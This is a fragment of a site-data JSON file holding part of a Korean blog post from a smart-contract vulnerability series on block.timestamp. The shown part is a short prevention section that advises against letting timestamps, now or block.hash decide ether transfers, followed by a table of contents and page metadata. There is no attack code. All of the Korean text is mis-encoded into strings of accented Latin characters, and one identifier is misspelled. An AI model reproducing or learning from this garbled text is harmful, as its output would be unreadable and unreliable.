id=\"ì–´ë–»ê²Œí•˜ë©´-ì˜ˆë°©í• -ìˆ˜-ìˆì„ê¹Œ\" style=\"position:relative;\"><a href=\"#%EC%96%B4%EB%96%BB%EA%B2%8C%ED%95%98%EB%A9%B4-%EC%98%88%EB%B0%A9%ED%95%A0-%EC%88%98-%EC%9E%88%EC%9D%84%EA%B9%8C\" aria-label=\"ì–´ë–»ê²Œí•˜ë©´ ì˜ˆë°©í•  ìˆ˜ ìˆì„ê¹Œ permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>ì–´ë–»ê²Œí•˜ë©´ ì˜ˆë°©í•  ìˆ˜ ìˆì„ê¹Œ?</h2>\n<p>block.timstampëŠ” ë¸”ë¡ìƒì„± ì‹œê°„ì´ í•„ìš”í•  ë•Œë§Œ ì‚¬ìš©í•˜ë©´ ëœë‹¤. randomì´ë‚˜ block.timestampê°€ ë“¤ì–´ê°€ ì¡°ê±´ì— ì˜í•´ì„œ etherê°€ ë˜ëŠ” ë°ì´í„°ê°€ ë³´ë‚´ì ¸ì„œëŠ” ì•ˆëœë‹¤.</p>\n<p>block.timestampì™€ ë§ˆì°¬ê°€ì§€ë¡œ <strong>now</strong>, <strong>block.hash</strong> ì˜ ì‚¬ìš©ë„ ë˜ë„ë¡ í”¼í•˜ëŠ” ê²ƒì´ ì¢‹ë‹¤.</p>\n<div class=\"table-of-contents\">\n<ul>\n<li><a href=\"#blocktimestamp%EB%9E%80\">block.timestampë€?</a></li>\n<li><a href=\"#%EC%99%9C-%EC%B7%A8%EC%95%BD%EC%A0%90-%EC%8B%9C%EB%A6%AC%EC%A6%88%EC%97%90-%EB%93%A4%EC%96%B4%EA%B0%94%EC%9D%84%EA%B9%8C\">ì™œ ì·¨ì•½ì  ì‹œë¦¬ì¦ˆì— ë“¤ì–´ê°”ì„ê¹Œ?</a></li>\n<li><a href=\"#example-code\">Example code</a></li>\n<li><a href=\"#%EC%96%B4%EB%96%BB%EA%B2%8C%ED%95%98%EB%A9%B4-%EC%98%88%EB%B0%A9%ED%95%A0-%EC%88%98-%EC%9E%88%EC%9D%84%EA%B9%8C\">ì–´ë–»ê²Œí•˜ë©´ ì˜ˆë°©í•  ìˆ˜ ìˆì„ê¹Œ?</a></li>\n</ul>\n</div>","frontmatter":{"date":"December 22, 2021","title":"(ì·¨ì•½ì  ì‹œë¦¬ì¦ˆ 3) block.timestamp","categories":"ì·¨ì•½ì ë¶„ì„","author":"í•œì„±ì›","emoji":"ğŸ§¢"},"fields":{"slug":"/smart_contract/block_timestamp/"}},"prev":null,"site":{"siteMetadata":{"siteUrl":"https://holyhansss.github.io","comments":{"utterances":{"repo":""}}}}},"pageContext":{"slug":"/smart_contract/delegate_call/","nextSlug":"/smart_contract/block_timestamp/","prevSlug":""}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}